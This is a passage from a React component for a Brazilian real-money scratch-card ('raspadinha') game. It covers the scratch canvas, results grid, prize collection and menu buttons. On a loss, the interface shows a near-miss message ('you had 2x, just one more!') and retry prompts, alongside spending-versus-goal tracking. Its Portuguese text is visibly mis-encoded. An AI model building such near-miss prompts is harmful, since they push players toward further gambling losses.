                  Investido: R$ {loyaltySequences[selectedPlan.id]?.spent || 0} | 
                  Meta: R$ {selectedPlan.cost * 10}
                </div>
                <div className="text-xs text-pink-300 mt-1">
                  {!scratchCard.hasReachedMinimum ? 'B√¥nus: Aguardando desbloqueio' : `Taxa atual: ${((scratchCard.finalReturnRate || selectedPlan.returnRate) * 100).toFixed(1)}%`}
                </div>
              </div>
            </div>
          )}
        </div>
        
        <div className="bg-gradient-to-br from-gray-900/80 via-purple-900/80 to-blue-900/80 backdrop-blur-lg rounded-xl p-4 sm:p-6 mb-6 border border-yellow-400/30 shadow-2xl">
          {/* Adendo explicativo */}
          <div className="bg-yellow-400/20 rounded-lg p-3 mb-4 border border-yellow-400/40">
            <div className="text-center">
              <div className="text-lg font-bold text-yellow-300 mb-1">
                üéØ COMO GANHAR üéØ
              </div>
              <div className="text-sm text-yellow-200">
                Encontre <span className="font-bold text-yellow-100">3 N√öMEROS IGUAIS</span> para ganhar o valor desse n√∫mero!
              </div>
              <div className="text-xs text-yellow-300 mt-1">
                Exemplo: 3x R$ 250 = Voc√™ ganha R$ 250! üéâ
              </div>
            </div>
          </div>
          
          {/* SISTEMA DE CAMADAS - IGUAL AO SEU C√ìDIGO */}
          <div className="relative" style={{ width: '300px', height: '200px', margin: '0 auto' }}>
            {/* CAMADA DOS N√öMEROS - SEMPRE VIS√çVEL POR BAIXO */}
            <div className="absolute inset-0 grid grid-cols-3 gap-1 p-2 bg-white rounded-lg border-2 border-gray-300">
              {scratchCard && scratchCard.numbers.map((number, index) => {
                // Contar quantas vezes cada n√∫mero aparece
                const numberCounts = {};
                scratchCard.numbers.forEach(num => {
                  numberCounts[num] = (numberCounts[num] || 0) + 1;
                });
                
                const isRepeated = numberCounts[number] >= 2;
                const isWinner = scratchCard.isWinner && number === scratchCard.prizeNumber;
                
                return (
                  <div 
                    key={index}
                    className={`flex items-center justify-center text-xs sm:text-sm font-bold rounded border-2 ${
                      isWinner 
                        ? 'bg-gradient-to-br from-yellow-400 to-orange-500 text-white border-yellow-300 animate-pulse' 
                        : isRepeated
                          ? 'bg-gradient-to-br from-yellow-300 to-yellow-400 text-gray-800 border-yellow-400'
                          : 'bg-gradient-to-br from-white to-gray-100 text-gray-800 border-gray-300'
                    }`}
                  >
                    R$ {number}
                  </div>
                );
              })}
            </div>

            {/* CANVAS DE COBERTURA - POR CIMA DOS N√öMEROS */}
            <canvas
              ref={canvasRef}
              width={300}
              height={200}
              className="absolute inset-0 border-2 border-white/30 rounded-lg cursor-pointer"
              onMouseDown={() => setIsScratching(true)}
              onMouseUp={() => setIsScratching(false)}
              onMouseMove={scratch}
              onMouseLeave={() => setIsScratching(false)}
              onTouchStart={(e) => {
                e.preventDefault();
                setIsScratching(true);
              }}
              onTouchEnd={() => setIsScratching(false)}
              onTouchMove={(e) => {
                e.preventDefault();
                const touch = e.touches[0];
                const rect = canvasRef.current.getBoundingClientRect();
                const mockEvent = {
                  clientX: touch.clientX,
                  clientY: touch.clientY
                };
                scratch(mockEvent);
              }}
            />
            
            {/* Barra de progresso */}
            <div className="mt-4 text-sm">
              <div className="flex justify-between items-center">
                <span className="text-cyan-300">√Årea raspada: {(scratchedArea * 100).toFixed(1)}%</span>
                <span className="text-yellow-300 font-bold animate-pulse">‚ö° Continue raspando! ‚ö°</span>
              </div>
              <div className="w-full bg-gray-700 rounded-full h-3 mt-2 border border-yellow-400/30">
                <div 
                  className="bg-gradient-to-r from-green-400 via-yellow-400 to-orange-400 h-3 rounded-full transition-all duration-300 shadow-lg"
                  style={{ width: `${Math.min(scratchedArea * 100, 100)}%` }}
                ></div>
              </div>
            </div>
          </div>
        </div>

        {/* TABELA DE N√öMEROS REVELADOS - S√ì APARECE AP√ìS RASPAR TUDO */}
        {scratchCard && isRevealed && (
          <div className="bg-gradient-to-br from-purple-900/80 via-blue-900/80 to-cyan-900/80 backdrop-blur-lg rounded-xl p-4 sm:p-6 mb-6 border border-cyan-400/30 shadow-2xl">
            <div className="text-center mb-4">
              <div className="text-lg font-bold text-cyan-300 mb-2">
                üéØ N√∫meros Revelados:
              </div>
              <div className="text-sm text-cyan-200">
                Resultado final da sua cartela
              </div>
            </div>
            
            <div className="grid grid-cols-3 gap-2 max-w-xs mx-auto mb-4">
              {scratchCard.numbers.map((number, index) => {
                // Contar quantas vezes cada n√∫mero aparece
                const numberCounts = {};
                scratchCard.numbers.forEach(num => {
                  numberCounts[num] = (numberCounts[num] || 0) + 1;
                });
                
                const count = numberCounts[number];
                const isWinner = scratchCard.isWinner && number === scratchCard.prizeNumber;
                const isRepeated = count >= 2;
                
                return (
                  <div 
                    key={index} 
                    className={`p-3 rounded-lg text-center font-bold text-lg transition-all duration-500 border-2 ${
                      isWinner 
                        ? 'bg-gradient-to-br from-yellow-400 to-orange-500 text-white animate-pulse border-yellow-300 shadow-lg shadow-yellow-400/50 transform scale-105' 
                        : isRepeated
                          ? 'bg-gradient-to-br from-yellow-500 to-yellow-600 text-white border-yellow-400 shadow-lg shadow-yellow-500/30'
                          : 'bg-gradient-to-br from-white to-gray-100 text-gray-800 border-gray-300'
                    }`}
                  >
                    R$ {number}
                    {count >= 2 && (
                      <div className="text-xs mt-1 opacity-75">
                        {count}x
                      </div>
                    )}
                  </div>
                );
              })}
            </div>

            {/* Resultado final */}
            <div className="text-center">
              {prize > 0 ? (
                <div className="text-xl font-bold text-green-300 animate-bounce bg-green-500/20 rounded-lg p-4 border border-green-400/40">
                  üéâ PARAB√âNS! Voc√™ ganhou R$ {prize}! üéâ
                </div>
              ) : (
                <div className="space-y-2">
                  <div className="text-lg font-bold text-orange-300 bg-orange-500/20 rounded-lg p-3 border border-orange-400/40">
                    üòÖ Poxa! Passou pertinho! 
                  </div>
                  {scratchCard.almostWinNumber && (
                    <div className="text-sm text-yellow-300 bg-yellow-500/20 rounded-lg p-2 border border-yellow-400/40">
                      üî• Voc√™ teve 2x R$ {scratchCard.almostWinNumber}! Faltou s√≥ mais um! üî•
                    </div>
                  )}
                  <div className="text-sm text-cyan-300">
                    üéØ Tente novamente! A sorte pode estar na pr√≥xima cartela!
                  </div>
                </div>
              )}
            </div>
          </div>
        )}
        
        {/* BOT√ïES DE A√á√ÉO - MOBILE FIRST */}
        <div className="w-full max-w-md mx-auto space-y-3">
          {/* Bot√£o de coletar pr√™mio - MOBILE OTIMIZADO */}
          {isRevealed && prize > 0 && (
            <button
              onClick={collectPrize}
              className="w-full bg-gradient-to-r from-green-500 via-emerald-500 to-teal-500 hover:from-green-600 hover:via-emerald-600 hover:to-teal-600 px-4 py-4 rounded-xl font-bold text-lg transition-all transform active:scale-95 shadow-lg animate-bounce border-2 border-green-300"
            >
              üéâ Coletar R$ {prize}! üéâ
            </button>
          )}
          
          {/* Bot√£o principal de navega√ß√£o - MOBILE OTIMIZADO */}
          <button
            onClick={() => {
              if (selectedPlan?.isPromo && promoCards.length > 0) {
                if (isRevealed) {
                  finishCurrentCard();
                } else {
                  setSelectedPlan(prev => ({ ...prev, currentCard: null }));
                  setScratchCard(null);
                  setRevealedNumbers([]);
                  setCellRevealStatus([]);
                }
              } else {
                setSelectedPlan(null);
                setIsRevealed(false);
                setScratchCard(null);
                setRevealedNumbers([]);
                setCellRevealStatus([]);
              }
            }}
            className="w-full bg-gradient-to-r from-blue-500 to-purple-600 hover:from-blue-600 hover:to-purple-700 px-4 py-4 rounded-xl font-bold text-lg transition-all transform active:scale-95 shadow-lg border-2 border-blue-300"
          >
            {selectedPlan?.isPromo 
              ? (isRevealed ? '‚û°Ô∏è Pr√≥xima Cartela' : 'üîô Escolher Cartela')
              : (isRevealed ? 'üé∞ Jogar Novamente' : 'üîô Voltar ao Menu')
            }
          </button>

          {/* Bot√£o de emerg√™ncia - MOBILE OTIMIZADO */}
          <button
            onClick={() => {
              // Reset completo for√ßado
              setSelectedPlan(null);
              setPromoCards([]);
              setIsRevealed(false);
              setScratchCard(null);
              setRevealedNumbers([]);
              setCellRevealStatus([]);
              setPrize(0);
            }}
            className="w-full bg-gradient-to-r from-red-500 to-red-600 hover:from-red-600 hover:to-red-700 px-4 py-3 rounded-xl font-bold text-base transition-all transform active:scale-95 shadow-lg border-2 border-red-300"
          >
            üè† Menu Principal
          </button>
        </div>

        {/* Status da raspadinha */}
        <div className="mt-4 text-center">
          <div className="text-sm opacity-75 mb-2">
            {scratchedArea < 0.8 
              ? 'Clique e arraste para raspar a cartela' 
              : isRevealed 
                ? 'Raspadinha completa! Veja o resultado acima.'
                : 'Quase l√°! Continue raspando...'
            }
          </div>
          
          {/* Instru√ß√µes din√¢micas */}
          {!isRevealed ? (
            <div className="text-xs opacity-50">
              Raspe para revelar os n√∫meros e encontre 3 iguais para ganhar!
            </div>
          ) : (
            <div className="text-xs text-green-300 bg-green-500/20 rounded-lg p-2 mt-2 border border-green-400/40">
              ‚úÖ Todos os n√∫meros foram revelados! {prize > 0 ? 'Voc√™ ganhou!' : 'Tente novamente na pr√≥xima cartela!'}
            </div>
          )}
        </div>
        

      </div>
    </div>
  );
};

export default SistemaRaspadinha;
